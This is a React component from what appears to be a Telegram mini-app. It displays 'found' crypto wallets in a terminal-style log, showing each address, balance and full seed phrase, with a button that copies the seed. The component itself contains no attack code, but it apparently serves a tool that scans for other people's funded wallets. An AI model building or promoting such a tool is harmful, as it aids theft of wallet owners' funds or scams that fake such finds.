import { useEffect, useState } from "react";
import { toast } from "sonner";
import { haptic } from "@/lib/telegram";

export interface FoundWallet {
  id: string;
  ts: string;
  coin: string;
  address: string;
  mnemonic: string;
  balance: number;
  balanceLabel?: string;
}

const mask = (addr: string) => {
  if (!addr || addr.length < 18) return addr;
  return `${addr.slice(0, 8)}***${addr.slice(-8)}`;
};

interface Props {
  hits: FoundWallet[];
  active: boolean;
}

export const FoundWallets = ({ hits, active }: Props) => {
  const [flashId, setFlashId] = useState<string | null>(null);

  useEffect(() => {
    if (hits.length === 0) return;
    setFlashId(hits[0].id);
    const t = setTimeout(() => setFlashId(null), 800);
    return () => clearTimeout(t);
  }, [hits]);

  const total = hits.reduce((s, h) => s + h.balance, 0);

  const onCopy = async (h: FoundWallet) => {
    haptic("light");
    try {
      await navigator.clipboard.writeText(`${h.coin} ${h.address}\n${h.mnemonic}`);
      toast.success("Copied");
    } catch {
      toast.error("Clipboard blocked");
    }
  };

  return (
      <div className="border border-primary/60 bg-card/60 border-glow">
        <div className="flex items-center justify-between border-b border-border/70 bg-muted/40 px-2 py-1 text-[10px] uppercase tracking-widest">
          <span className="text-muted-foreground truncate">$ ./hits.log</span>
          <span className="text-primary text-glow shrink-0 ml-2 tabular-nums">
          {hits.length} hit{hits.length === 1 ? "" : "s"} · {total.toFixed(6)}
        </span>
        </div>
        <div className="max-h-72 sm:max-h-96 overflow-y-auto">
          {hits.length === 0 ? (
              <div className="px-2 py-4 text-center text-[10px] uppercase tracking-widest text-muted-foreground">
                {active ? "scanning…" : "idle — press [INIT]"}
              </div>
          ) : (
              <ul className="divide-y divide-border/40">
                {hits.map((h) => (
                    <li
                        key={h.id}
                        className={`px-2 py-1.5 space-y-1 transition-colors ${
                            flashId === h.id ? "bg-primary/20 animate-fade-in" : "animate-fade-in"
                        }`}
                    >
                      <div className="flex items-center gap-2 text-[10px] sm:text-xs">
                  <span className="text-muted-foreground/70 tabular-nums shrink-0 hidden xs:inline">
                    {h.ts}
                  </span>
                        <span className="text-primary text-glow font-bold shrink-0">▸</span>
                        <span className="shrink-0 text-[hsl(var(--terminal-warn))] font-bold tabular-nums">
                    {h.coin}
                  </span>
                        <span className="font-bold text-primary text-glow tabular-nums shrink-0">
                    {mask(h.address)}
                  </span>
                        <span className="ml-auto text-[hsl(var(--terminal-warn))] tabular-nums shrink-0 font-bold">
                    +{h.balanceLabel ?? h.balance.toFixed(6)}
                  </span>
                      </div>
                      <div className="flex items-center gap-2 pl-4">
                  <span className="truncate text-[9px] sm:text-[10px] text-muted-foreground italic min-w-0 flex-1">
                    {h.mnemonic}
                  </span>
                        <button
                            type="button"
                            onClick={() => onCopy(h)}
                            className="shrink-0 border border-primary/60 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-primary hover:bg-primary/20 active:scale-95 transition-all"
                        >
                          ⧉ COPY
                        </button>
                      </div>
                    </li>
                ))}
              </ul>
          )}
        </div>
      </div>
  );
};